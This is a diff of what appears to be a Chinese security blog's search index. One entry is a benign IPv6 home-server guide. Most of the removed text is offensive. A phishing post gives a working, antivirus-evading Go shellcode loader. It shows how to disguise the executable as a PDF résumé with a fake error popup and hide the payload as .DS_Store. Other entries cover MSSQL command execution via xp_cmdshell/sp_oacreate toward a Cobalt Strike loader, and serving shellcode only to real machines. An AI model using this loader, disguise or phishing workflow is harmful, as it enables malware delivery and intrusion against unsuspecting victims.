-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyTCPHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Server is listening on &#123;&#125;:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.client_address[<span class="number">0</span>], self.client_address[<span class="number">1</span>]))</span><br><span class="line">        data = self.request.recv(<span class="number">1024</span>).strip().decode()</span><br><span class="line">        memory,core  = data.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;内存大小为：&#123;&#125;MB，处理器数量为：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(memory,core))</span><br></pre></td></tr></table></figure>
-<p>在获取到计算机硬件信息后，将信息存储到一个列表里，通过flask创建一个路由用来返回json格式的数据，再在前端通过fetch来获取数据并显示出来</p>
-<h2 id="显示数据">显示数据</h2>
-<p>通过displayBox函数将收到的数据显示出来</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">displayBox</span>(<span class="params">time,ip, memory, core</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> container = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;container&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> content = <span class="string">&quot;连接时间为：&quot;</span>+time+<span class="string">&quot;&lt;br&gt;IP地址为：&quot;</span> + ip + <span class="string">&quot;&lt;br&gt;内存大小为：&quot;</span> + memory + <span class="string">&quot;MB&lt;br&gt;处理器数量为：&quot;</span> + core + <span class="string">&quot;个&lt;div&gt;&lt;button class = &#x27;button&#x27; onclick=&#x27;AllowFunction(\&quot;&quot;</span> + ip + <span class="string">&quot;\&quot;, 1)&#x27;&gt;允许&lt;/button&gt;&lt;button class = &#x27;button&#x27; onclick=&#x27;AllowFunction(\&quot;&quot;</span> + ip + <span class="string">&quot;\&quot;, 0)&#x27; &gt;拒绝&lt;/button&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> box = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">  box.<span class="property">className</span> = <span class="string">&quot;red-box&quot;</span>;</span><br><span class="line">  box.<span class="property">innerHTML</span> = content;</span><br><span class="line">  container.<span class="title function_">appendChild</span>(box);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="“允许”或“拒绝”">“允许”或“拒绝”</h2>
-<p>在上述函数中，点击“允许”调用<code>AllowFunction(ip,1)</code>，点击拒绝则调用<code>AllowFunction(ip,0)</code></p>
-<p>通过AllowFunction函数向flask服务器发起一个请求来修改对应ip的准接入结果</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">function</span> <span class="title function_">AllowFunction</span>(<span class="params">ip, isallow</span>)&#123;</span><br><span class="line"><span class="comment">// 构建请求的 URL</span></span><br><span class="line">  <span class="keyword">const</span> url = host+<span class="string">`change?ip=<span class="subst">$&#123;ip&#125;</span>&amp;isallow=<span class="subst">$&#123;isallow&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// 发起 GET 请求</span></span><br><span class="line">  <span class="title function_">fetch</span>(url)</span><br><span class="line">   .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;请求成功&quot;</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求失败&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;)</span><br><span class="line">   .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求发生错误&quot;</span>, error);</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure>
-<p>最后回到socket服务端，将修改后的结果返回给socket客户端</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.request.sendall(<span class="built_in">str</span>(cmps[i][<span class="string">&quot;isallow&quot;</span>]).encode())</span><br></pre></td></tr></table></figure>
-<h1 id="效果">效果</h1>
-<p><img src="image-20230702154823650.png" alt="image-20230702154823650"></p>
-<p>第一个是真机，第二个是虚拟机<img src="image-20230702164949851.png" alt="image-20230702164949851"></p>
-<h1 id="升级">升级</h1>
-<p>通过准接入系统可以做的事情还有很多，可以试着携带更多的信息来帮助我们判断是真机还是虚拟机，同时也可以将shellcode放到服务器，允许接入后将shellocde返回给客户端并加载。</p>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>准入</tag>
       </tags>
   </entry>
   <entry>
@@ -1325,6 +1482,77 @@ InitialContext#lookup</p>
       </tags>
   </entry>
   <entry>
+    <title>利用ipv6搭建一台服务器</title>
+    <url>/post/%E5%88%A9%E7%94%A8ipv6%E6%90%AD%E5%BB%BA%E4%B8%80%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+    <content><![CDATA[<h3 id="背景">背景</h3>
+<p>继上次发现ipv6以来由于要实习，一直只是在尝试部分小功能的实现，终于在这个春节假期才有了一大段空闲时间来部署服务器</p>
+<h3 id="硬件需求">硬件需求</h3>
+<p>首先要搭建属于自己的服务器得要有一定的硬件条件，服务器其实就是一台一天24小时开启的计算机，家里有一台10年前的电脑，处理器是4核的赛扬j1900，其实已经是满足我的基本需求了的，但一是电脑已经装了windows系统并储存了一些资料不能随意重装linux系统，所以我决定买一台迷你主机。</p>
+<p>在某鱼上花280买了一台<strong>迷你主机</strong>，处理器是奔腾n3540,4+256的，同时准备一个储存<strong>大于或等于8G</strong>的u盘</p>
+<p><img src="761de0f3c70c43659a554c024a231ea0.jpeg" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="准备工作">准备工作</h3>
+<p>我准备使用<strong>centos7</strong>作为服务器的操作系统，所以要下载centos7的镜像</p>
+<p><a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/">centos-7-isos-x86_64安装包下载_开源镜像站-阿里云 (aliyun.com)</a></p>
+<p><img src="55ec81e2cb7f4039b6d0396ba8f6dbd1.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>下载balenaetcher将iso文件烧录至U盘中</p>
+<p><a href="https://www.balena.io/etcher#download-etcher">balenaEtcher - Flash OS images to SD cards &amp; USB drives</a></p>
+<p>可以以这个up主的视频作为参考</p>
+<p><a href="https://b23.tv/LeqXDBR">（上）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a><br>
+<a href="https://b23.tv/dgXG2DN">（下）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a></p>
+<h3 id="安装系统">安装系统</h3>
+<p>安装系统的步骤参考上面两个视频，但可能会遇得到安装失败情况（俺就遇到了）</p>
+<p><img src="e14067cf3de543a9b7e8d2ff3c9e7300.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>原因是因为计算机插入U盘以后加上计算机本身自带的储存空间一共有两块硬盘，而我们在安装的时候没有指定安装文件（.iso）在哪个硬盘里面，所以安装失败，只需选中正确的安装硬盘就可以了，解决方法可以参照下面两个大佬的方法：</p>
+<p><a href="https://blog.csdn.net/zwhfyy/article/details/78991446">Centos7安装时引导错误以及解决方案_zwhfyy的博客-CSDN博客_centos 安装报错</a></p>
+<p><a href="https://blog.csdn.net/weixin_34205826/article/details/93020109">Centos安装错误的解决方法_weixin_34205826的博客-CSDN博客</a></p>
+<h3 id="配置网络">配置网络</h3>
+<p>系统安装完成以后就要开始配置网络了，我采取的方法是在局域网内使用固定的ipv4地址，同时开启centos的ipv6地址</p>
+<p>首先使用ifconfig查看网卡名字和分配的ip地址，如果已经有ipv6和ipv4地址了就不用管了，如果没有就需要对网卡配置文件进行修改</p>
+<p>使用以下命令对网卡配置进行修改</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-网卡名字 <span class="comment">#打开网卡配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#没有ipv6则加上这么几句话</span></span><br><span class="line">IPV6INIT=<span class="built_in">yes</span></span><br><span class="line">IPV6_AUTOCONF=<span class="built_in">yes</span></span><br><span class="line">IPV6_DEFROUTE=<span class="built_in">yes</span></span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启网卡</span></span><br><span class="line">systemctl restart network</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>弄好以后可以用外网ping一下看分配到的ipv6地址是否能够ping通</p>
+<p>目前如果在服务器上开启一些服务的话是通过<strong>http://[ipv6地址]:端口号</strong>来访问的，这样很麻烦，而且我们从运营商处得到的ipv6地址是一个**动态的地址，**随着计算机重启或者隔一段时间地址就会发生改变，所以我们要获取一个域名，并通过ddns将ipv6地址和域名绑定起来(懒得弄的也可以写个程序定时将ipv6地址发给自己)</p>
+<h3 id="获取域名">获取域名</h3>
+<p>国内获得域名可以通过很多的渠道，我这里是在<a href="https://wanwang.aliyun.com/?scm=20140722.S_card@@%E5%95%86%E5%93%81@@212429.S_cardgbdt.ID_card@@%E5%95%86%E5%93%81@@212429-RL_%E5%9F%9F%E5%90%8D-OR_ser-V_2-P0_0">阿里云</a>上花了8块买了一年的域名（需要实名认证），然后添加记录</p>
+<p><img src="86c56a549f2a47d4b4403705f2ac7017.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>记录类型选择<strong>AAAA表示ipv6地址</strong></p>
+<p>主机记录填写<strong>子域名名称</strong></p>
+<p>记录值填<strong>对应的ipv6地址</strong></p>
+<p>添加完后进行<strong>生效检测</strong>查看是否能够成功解析</p>
+<p><strong>DDNS</strong></p>
+<p>DDNS（Dynamic Domain Name Server，动态域名服务）是将用户的动态IP地址映射到一个固定的域名解析服务上，用户每次连接网络的时候客户端程序就会通过信息传递把该主机的动态IP地址传送给位于服务商主机上的服务器程序，服务器程序负责提供DNS服务并实现动态域名解析。</p>
+<p>网上有很多如何使用DDNS的教程，这里我使用的是是一个大佬分享的python脚本（服务器要安装pyhton运行环境，可以直接下载一个宝塔，会自动安装pyhton3.6）</p>
+<p><a href="https://github.com/zeruns/-Python-aliddns_ipv4-ipv6">zeruns/-Python-aliddns_ipv4-ipv6: 阿里云域名ddns动态域名解析Python源码 (github.com)</a></p>
+<p>使用教程：<a href="https://blog.zeruns.tech/archives/507.html">Python实现阿里云域名DDNS支持ipv4和ipv6 - Zeruns’s Blog</a></p>
+<p>（可以先把自己在阿里云上的ipv6地址改成错误的，然后运行一次程序查看ipv6地址是否被修改回来了）</p>
+<p>接着通过linux中的crontab设置定时任务运行python脚本（我的这里似乎不能直接运行python，需要将用shell脚本运行python然后再用在crontab中定时shell脚本）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="comment">#ddns.sh</span></span><br><span class="line"><span class="built_in">cd</span> /home/xxx  <span class="comment"># 写你自己py文件的文件夹</span></span><br><span class="line">/usr/bin/python3.6 aliddns.py &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>添加定时任务</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line">0 */4 * * * /home/xxx/ddns.sh  <span class="comment">#这里要输入shell脚本的绝对位置</span></span><br><span class="line"><span class="comment">#我是设置的每4个小时运行一次脚本，大家可以根据自己的情况选择脚本的运行时间</span></span><br></pre></td></tr></table></figure>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>这样ipv6地址就和域名绑定起来了</p>
+<p>到此为止基本的搭建任务就结束了</p>
+<h3 id="一些不得不提的安全问题">一些不得不提的安全问题</h3>
+<p>我们一般访问自己的linux服务器都是通过ssh的方式访问的，而将ssh服务直接暴露出来会存在一定的安全风险，所以我们最好做一些安全措施来保护我们的服务器不被他人入侵</p>
+<p>1.使用密钥登录ssh而非使用密码登录，防止被他人暴力破解</p>
+<p>2.修改ssh服务的默认端口，ssh的默认端口是22，而网上很多端口扫描的工具都会将22端口作为端口进行扫描</p>
+<p>3.取消root登录</p>
+<p>4.使用knockd来隐藏端口（终极隐藏大法）</p>
+<p><a href="https://cloud.tencent.com/developer/article/1005328">knockd：CVM云主机的隐形斗篷 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<p>虽然这些操作很复杂，但我想告诉你网络安全真的很重要！！！</p>
+<p>（我的一个朋友之前就因为ssh密码被爆破而被入侵了……）</p>
+]]></content>
+      <categories>
+        <category>经历</category>
+      </categories>
+      <tags>
+        <tag>ipv6</tag>
+        <tag>服务器</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>后渗透之权限提升</title>
     <url>/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
     <content><![CDATA[<h1 id="序">序</h1>
@@ -1395,142 +1623,6 @@ InitialContext#lookup</p>
       </categories>
       <tags>
         <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>邮箱钓鱼学习</title>
-    <url>/post/%E9%82%AE%E7%AE%B1%E9%92%93%E9%B1%BC%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p><code>邮箱钓鱼</code>是一种常见的网络攻击手段,它利用伪造的电子邮件来诱导目标用户点击恶意链接或附件,从而窃取敏感信息或执行恶意代码。在进行网络攻击的时候非常常见,毕竟资产最薄弱的部分依旧还是人。</p>
-<h1 id="制作免杀马">制作免杀马</h1>
-<p>邮箱钓鱼攻击的成功与否很大程度上取决于攻击者能否绕过目标系统的防御措施,如杀毒软件、防火墙、沙箱等。因此,学习如何制作免杀的恶意代码是提高邮箱钓鱼攻击效果的关键。</p>
-<p>目前网上有非常多能够帮助shellcode免杀的工具,也可以自己尝试写一写,这里以绕过360为目标</p>
-<p>参考<a href="https://www.freebuf.com/articles/endpoint/323789.html">云山雾隐的shellcode免杀入门文章</a>我们可以得到一个基础的免杀马</p>
-<p>大致原理是对shellcode进行<code>异或加密</code>再<code>base64编码</code>得到密文,然后再对密文进行解码同时加载到内存中,但这种方式同样容易被查杀（2023.6.2测试被杀）,所以我们可以分开写,弄两个文件,一个文件（文件名为.DS_Store）存放我们所加密的shellcode,另外一个可执行文件负责读取shellcode并加载到内存中</p>
-<p>shell.go代码如下：</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;unsafe&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kk = []<span class="type">byte</span>&#123;<span class="number">0x1b</span>, <span class="number">0x51</span>,<span class="number">0x11</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">content, err := ioutil.ReadFile(<span class="string">&quot;.DS_Store&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Error reading file:&quot;</span>, err)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="type">string</span>(content)</span><br><span class="line"></span><br><span class="line">charcode := DD(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;charcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DD</span><span class="params">(src <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">ss, _ := base64.StdEncoding.DecodeString(src)</span><br><span class="line"><span class="keyword">var</span> shellcode []<span class="type">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(ss); i++ &#123;</span><br><span class="line">shellcode = <span class="built_in">append</span>(shellcode, ss[i]^kk[<span class="number">1</span>]^kk[<span class="number">2</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>编译生成可执行文件shell.exe</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go build -ldflags=&quot;-s -w -H=windowsgui&quot; shell.go</span><br></pre></td></tr></table></figure>
-<p><img src="image-20230604163030198.png" alt="image-20230604163030198"></p>
-<p>双击后可发现木马成功上线（2023.6.4测试）</p>
-<p><img src="image-20230604163823173.png" alt="image-20230604163823173"></p>
-<h1 id="伪装">伪装</h1>
-<p>要想让鱼上钩就必须做好伪装,发送一个shell.exe只有傻子才会点,所以我们一般将文件伪装成一个pdf文档发送</p>
-<p>给受害者</p>
-<h2 id="pdf图标-命名">pdf图标+命名</h2>
-<p>使用<code>iconsext.exe</code>提取一个电脑上自带的pdf图标,我这里选择edge的pdf图标,得到对应的ico文件</p>
-<p>再利用<code>ico替换.exe</code>将shell.exe的图标替换</p>
-<p><img src="image-20230604170107321.png" alt="image-20230604170107321"></p>
-<p>接下来改个后缀,这里不能直接使用pdf.exe,也不能使用空格填充,因为360发现这种文件会直接查杀,所以我们可以找个特殊字符来替换pdf,并且让文件名字尽可能的长,尽量让受害者注意不到最后的exe,这里使用希腊字母的Ρ来代替,名字改为<code>xxxx大学_xxxx学院_xxxx专业_xxxxx个人简历.ΡDF.exe</code></p>
-<h2 id="文档报错">文档报错</h2>
-<p>可以利用GoFileBinder将shell.exe和一个正常的pdf文档绑定起来,打开exe后是一个正常的pdf文件,同时机器也会在后台悄悄上线,但如果我们钓鱼的目标不一样,那么对应打卡的pdf文档也要不一样,有的是一份简历,有的是一份通告……所以最方便的方法就是让受害者打开pdf后直接弹窗报错</p>
-<p>这里使用MessageBoxW这个api,代码如下</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">MessageBoxPlain(<span class="string">&quot;提示&quot;</span>, <span class="string">&quot;文件已损坏,无法打开&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MessageBoxPlain</span><span class="params">(title, caption <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> (</span><br><span class="line">        NULL = <span class="number">0</span></span><br><span class="line">        MB_OK = <span class="number">0</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> MessageBox(NULL, caption, title, MB_OK)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MessageBox</span><span class="params">(hwnd <span class="type">uintptr</span>, caption, title <span class="type">string</span>, flags <span class="type">uint</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    ret, _, _ := syscall.NewLazyDLL(<span class="string">&quot;user32.dll&quot;</span>).NewProc(<span class="string">&quot;MessageBoxW&quot;</span>).Call(</span><br><span class="line">        <span class="type">uintptr</span>(hwnd),</span><br><span class="line">        <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))),</span><br><span class="line">        <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),</span><br><span class="line">        <span class="type">uintptr</span>(flags))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="type">int</span>(ret)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>效果：</p>
-<p><img src="image-20230604164839058.png" alt="image-20230604164839058"></p>
-<p>将上述代码写入到shell.go中即可实现弹窗（位置要在syscall.Syscall(addr, 0, 0, 0, 0)上方,要先弹窗再执行shellcode）</p>
-<h2 id="隐藏文件">隐藏文件</h2>
-<p>.DS_Store（Desktop Services Store）文件是苹果公司操作系统 macOS 下用于存储目录的自定义属性和元数据的隐藏文件。这些属性和元数据包括文件夹的位置、图标、背景和视图选项等信息,可以帮助操作系统快速访问和渲染文件夹。在 macOS 的 Finder 中,每个文件夹都有一个与之对应的 .DS_Store 文件,它会随着文件夹的创建、打开、关闭和移动等操作而被创建或更新。</p>
-<p>这里将shellcode代码文件命名为.DS_Store就是为了减少受害者使用解压软件浏览压缩包时的疑心</p>
-<p>可以将.DS_Store文件设为隐藏文件来达到解压完后文件消失的效果,但是如果受害者开启了“查看隐藏项目”,那将会暴露该文件,可以使用以下命令将文件进行进一步的隐藏</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">attrib +S +H .DS_Store</span><br></pre></td></tr></table></figure>
-<p>这下就算开了“查看隐藏项目”也无法看到隐藏的文件</p>
-<p><img src="image-20230604173322404.png" alt="image-20230604173322404"></p>
-<p>这时候就可以打个压缩包发给受害者了（windows自带的压缩功能无法压缩的话使用WinRAR等第三方工具）</p>
-<p>效果：</p>
-<p><img src="image-20230604173628947.png" alt="image-20230604173628947"></p>
-<p><img src="image-20230604173846465.png" alt="image-20230604173846465"></p>
-<h1 id="钓鱼平台">钓鱼平台</h1>
-<p>这里使用gophish搭建钓鱼平台,详细的搭建指南可以查看<a href="http://blog.leanote.com/post/snowming/a6b66097bccd">这篇文章</a></p>
-<p>利用gophish我们可以自定义发件人和批量发送邮件到目标邮箱</p>
-<p>效果截图</p>
-<p><img src="image-20230604214339030.png" alt="image-20230604214339030"></p>
-<p>参考：</p>
-<p><a href="https://xz.aliyun.com/t/11885#toc-4">记一个常规的免杀钓鱼流程</a></p>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>免杀</tag>
-        <tag>社工</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>暗月ack靶场学习记录</title>
-    <url>/post/%E6%9A%97%E6%9C%88ack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>最近打了一套新的靶场——暗月ack,学到了很多新东西,特此记录</p>
-<h1 id="烂土豆（RottenPotato）">烂土豆（RottenPotato）</h1>
-<p><code>烂土豆（Rotten Potato） MS16-075</code> 是一种利用 Windows 客户端操作系统中 NT AUTHORITY\SYSTEM 权限漏洞的攻击方法,可以实现本地提权,对应的补丁号为<code>KB3164038</code></p>
-<p>适用版本：<code>Windows 7、8、10、2008、2012</code></p>
-<p>当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时,Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞。成功利用此漏洞的攻击者可以使用提升的特权执行任意代码</p>
-<p>若要利用此漏洞,攻击者首先必须登录系统。然后,攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序,从而控制受影响的系统,可见,该漏洞的利用方式还是比较简单的</p>
-<p>首先在拥有一个登录用户的情况下输入<code>whoami /prive</code>查看当前用户的权限</p>
-<p>如果发现有<code>SeAssignPrimaryTokenPrivilege</code>权限或者<code>SeImpersonatePrivilege</code> 权限并且系统未打对应的补丁则可以成功利用烂土豆提权</p>
-<h1 id="MSSQL拿shell">MSSQL拿shell</h1>
-<p>拿到sql server的<code>sa账户</code>以后可以通过<code>xp_cmdshell</code>来执行系统命令</p>
-<p>先判断xp_shell是否存在</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;X&#x27; and name=&#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure>
-<p>如果显示0则可以通过以下命令重新加载</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;);</span><br></pre></td></tr></table></figure>
-<p>执行命令方法为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;whoami&#x27;;</span><br></pre></td></tr></table></figure>
-<p>在命令执行之后下一步的目标就是拿shell,这里采用的方法是利用windows自带的<code>certutil</code>下载shellcode加载器</p>
-<p>但是使用xp_cmdshell去调用certutil会发现被火绒拦截了,所以我们需要使用<code>sp_oacreate</code>来执行命令</p>
-<blockquote>
-<p><code>xp_cmdshell</code> 和 <code>sp_oacreate</code> 都是 SQL Server 中用于执行操作系统命令的工具,但是它们之间存在一些差异</p>
-<p><code>xp_cmdshell</code> 是在 SQL Server 上直接调用 Windows 的 <code>cmd.exe</code> 执行指定的命令,因此容易被杀毒软件和防火墙拦截。当执行 <code>xp_cmdshell</code> 命令时,如果杀毒软件或防火墙检测到其中包含有潜在的安全威胁,则可能会立即阻止该命令的执行</p>
-<p>相比之下,<code>sp_oacreate</code> 是使用 SQL Server 的 COM (组件对象模型) 接口创建一个外部对象,并通过该对象调用操作系统命令,因此在某种程度上可以绕过杀毒软件或防火墙的检测。但是,由于它需要使用 COM 对象,而且需要启用 <code>Ole Automation Procedures</code> 选项才能使用,因此在某些情况下可能不太方便使用</p>
-</blockquote>
-<p><code>sp_oacreate</code>可以删除、复制、移动文件,还能配合<code>sp_oamethod</code>来写文件执行<code>cmd</code>,但是<code>sp_oamethod</code>无回显</p>
-<p>首先要开启<code>sp_oacreate</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;,1;</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>
-<p>将 certutil.exe 复制到 C:\Windows\Temp\ 下,并重命名为 sethc.exe</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @o int; exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\Windows\System32\certutil.exe&#x27; ,&#x27;c:\windows\temp\sethc.exe&#x27;;</span><br></pre></td></tr></table></figure>
-<p>生成cobalt strike 的shellcode加载器</p>
